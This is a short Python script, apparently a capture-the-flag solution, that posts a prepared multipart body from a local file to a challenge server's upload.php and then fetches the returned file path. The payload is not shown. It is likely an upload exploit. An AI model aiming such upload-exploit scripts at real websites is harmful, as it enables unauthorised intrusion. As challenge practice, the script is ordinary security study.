from requests import get, post
from bs4 import BeautifulSoup

URL = 'http://challenges.wsi.edu.pl:5017/'

with open('data', 'rb') as file:
    data = file.read()
    html = post(f'{URL}/upload.php', headers={'Content-Type': 'multipart/form-data; boundary=---------------------------76597926716710384763989494291'}, data=data).content
    pos = BeautifulSoup(html, 'html.parser').find(class_='small').text
    print(get(f'{URL}/{pos}').content)